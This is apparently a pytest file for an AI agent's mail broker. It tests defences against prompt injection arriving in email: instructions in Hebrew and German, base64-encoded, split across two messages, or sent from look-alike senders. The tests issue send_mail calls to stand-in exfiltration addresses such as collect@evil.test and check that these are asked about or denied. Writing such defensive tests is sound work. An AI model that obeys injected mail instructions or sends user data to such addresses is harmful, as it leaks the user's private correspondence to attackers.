"""Attacks 11-17: non-English, encoded, split, and look-alike-sender injections.

Taint comes only from the sender address. These tests show the same outcome whatever the
language or encoding, and show that content from a known contact does not taint.
"""

from broker.approvals.base import ApprovalOutcome
from broker.rules.models import Verdict
from tests.conftest import WorldFactory

EXFIL = "collect@evil.test"


def test_11_hebrew_instruction_from_unknown_sender(world: WorldFactory) -> None:
    w = world(messages=["m_hebrew"])
    w.call("read_message", message_id="m_hebrew")
    assert w.session.tainted
    result = w.call("send_mail", to=[EXFIL], subject="הודעות", body="...")
    assert result.verdict == Verdict.ASK
    assert w.backend.sent == []


def test_12_german_instruction_cautious_profile_denies(world: WorldFactory) -> None:
    w = world(profile="cautious", messages=["m_german"])
    w.call("read_message", message_id="m_german")
    assert w.session.tainted
    result = w.call("send_mail", to=[EXFIL], subject="Weiterleitung", body="...")
    assert result.verdict == Verdict.DENY
    assert w.approver.requests == []


def test_13_same_hebrew_text_from_known_contact_does_not_taint(world: WorldFactory) -> None:
    """Proves taint is the sender rule, not a content classifier. Every send still asks."""
    w = world(messages=["m_hebrew_known"])
    w.call("read_message", message_id="m_hebrew_known")
    assert not w.session.tainted
    result = w.call("send_mail", to=[EXFIL], subject="x", body="...")
    assert result.verdict == Verdict.ASK
    assert w.backend.sent == []


def test_14_base64_encoded_instruction(world: WorldFactory) -> None:
    w = world(messages=["m_base64"])
    w.call("read_message", message_id="m_base64")
    assert w.session.tainted
    result = w.call("send_mail", to=[EXFIL], subject="sync", body="last 10 messages")
    assert result.verdict == Verdict.ASK
    assert w.backend.sent == []


def test_15_instruction_split_across_two_messages(world: WorldFactory) -> None:
    """Here the user approves: what is sent must be exactly what the prompt showed."""
    w = world(messages=["m_split1", "m_split2"], default=ApprovalOutcome.APPROVED)
    w.call("read_message", message_id="m_split1")
    w.call("read_message", message_id="m_split2")
    assert w.session.tainted
    result = w.call("send_mail", to=[EXFIL], subject="Approved by finance", body="Q3: 4.2M")
    assert result.verdict == Verdict.ASK
    [prompt] = w.approver.requests
    assert prompt.recipients == [EXFIL]
    assert prompt.subject == "Approved by finance"
    [sent] = w.backend.sent
    assert (sent.to, sent.subject, sent.body) == ([EXFIL], "Approved by finance", "Q3: 4.2M")


def test_16_lookalike_display_name_is_unknown_sender(world: WorldFactory) -> None:
    w = world(messages=["m_lookalike", "m_lunch"])
    w.call("read_message", message_id="m_lunch")  # the real Alice
    assert not w.session.tainted
    w.call("read_message", message_id="m_lookalike")  # "Alice" <alice@w0rk.test>
    assert w.session.tainted


def test_17_lookalike_send_asks_even_in_autonomous(world: WorldFactory) -> None:
    w = world(profile="autonomous", messages=["m_lookalike"], default=ApprovalOutcome.DENIED)
    w.call("read_message", message_id="m_lookalike")
    result = w.call(
        "send_mail", to=['"Alice" <alice.new@evil.test>'], subject="Contract", body="signed"
    )
    assert result.verdict == Verdict.ASK
    [prompt] = w.approver.requests
    assert prompt.recipients == ["alice.new@evil.test"]  # the address, not the name
    assert w.backend.sent == []
